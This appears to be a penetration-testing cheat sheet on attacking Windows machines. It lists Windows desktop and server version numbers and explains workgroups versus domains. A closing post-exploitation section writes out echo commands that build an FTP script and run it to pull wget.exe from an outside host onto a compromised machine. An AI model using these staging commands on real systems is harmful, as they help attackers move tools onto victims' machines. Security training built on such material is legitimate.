# Attacking Windows Boxes
## Windows Desktop Versions

| Operating System | Version Number |
| --- | --- |
| Windows 1.0 | v1.04 |
| Windows 2.0 | v2.11 |
| Windows 3.0 | v3 |
| Windows NT 3.1 | v3.10.528 |
| Windows for Workgroups 3.11 | v3.11 |
| Windows NT Workstation 3.5 | v3.5.807 |
| Windows NT Workstation 3.51 | v3.51.1055 |
| Windows 95 | v4.0.950 |
| Windows NT Workstation 4.0 | v4.0.1381 |
| Windows 98 | v4.1.1381 |
| Windows 98 Second Edition | v4.1.2222|
| Windows Me | v4.90.3000 |
| Windows 2000 Professional | v5.0.2195 |
| Windows XP | v5.1.2600 |
| Windows Vista | v6.0.6000 |
| Windows 7 | v6.1.7600 |
| Windows 8.1 | v6.3.9600 |
| Windows 10 | v10.0.10240 |

## Windows Server Versions
```
Windows NT 3.51                  NT 3.51
Windows NT 3.5                   NT 3.50
Windows NT 3.1                   NT 3.10
Windows 2000                     NT 5.0     

    Windows 2000 Server
    Windows 2000 Advanced Server
    Windows 2000 Datacenter Server

Windows NT 4.0                   NT 4.0     

    Windows NT 4.0 Server
    Windows NT 4.0 Server Enterprise
    Windows NT 4.0 Terminal Server Edition

Windows Server 2003              NT 5.2     

    Windows Small Business Server 2003
    Windows Server 2003 Web Edition
    Windows Server 2003 Standard Edition
    Windows Server 2003 Enterprise Edition
    Windows Server 2003 Datacenter Edition
    Windows Storage Server

Windows Server 2003 R2           NT 5.2     

    Windows Small Business Server 2003 R2
    Windows Server 2003 R2 Web Edition
    Windows Server 2003 R2 Standard Edition
    Windows Server 2003 R2 Enterprise Edition
    Windows Server 2003 R2 Datacenter Edition
    Windows Compute Cluster Server 2003 (CCS)
    Windows Storage Server
    Windows Home Server

Windows Server 2008               NT 6.0     

    Windows Server 2008 Standard
    Windows Server 2008 Enterprise
    Windows Server 2008 Datacenter
    Windows Server 2008 for Itanium-based Systems
    Windows Server Foundation 2008
    Windows Essential Business Server 2008
    Windows HPC Server 2008
    Windows Small Business Server 2008
    Windows Storage Server 2008
    Windows Web Server 2008

Windows Server 2008 R2            NT 6.1     

    Windows Server 2008 R2 Foundation
    Windows Server 2008 R2 Standard
    Windows Server 2008 R2 Enterprise
    Windows Server 2008 R2 Datacenter
    Windows Server 2008 R2 for Itanium-based Systems
    Windows Web Server 2008 R2
    Windows Storage Server 2008 R2
    Windows HPC Server 2008 R2
    Windows Small Business Server 2011
    Windows MultiPoint Server 2011
    Windows Home Server 2011
    Windows MultiPoint Server 2010

Windows Server 2012               NT 6.2     

    Windows Server 2012 Foundation
    Windows Server 2012 Essentials
    Windows Server 2012 Standard
    Windows Server 2012 Datacenter
    Windows MultiPoint Server 2012

Windows Server 2012 R2            NT 6.3     

    Windows Server 2012 R2 Foundation
    Windows Server 2012 R2 Essentials
    Windows Server 2012 R2 Standard
    Windows Server 2012 R2 Datacenter

Windows Server 2016     2016       NT 10.0
```

## Workgroups vs. Domains
| Type | Description |
| --- | --- |
| Workgroup | Peer-to-Peer, Home network for small business. |
| Domains | Server-Client setup.  Login to central Domain Server via Active Directory. |


## Transferring Files to Windows - _(Post-Exploitation)_
Using the `ftp-client` that is preinstalled onto Windows:
```
echo open 192.168.1.101 21> ftp.txt
echo USER asshat>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin>> ftp.txt
echo GET wget.exe>> ftp.txt
echo bye>> ftp.txt
```

**Afterwards run this to connect:**
```
ftp -v -n -s:ftp.txt
```
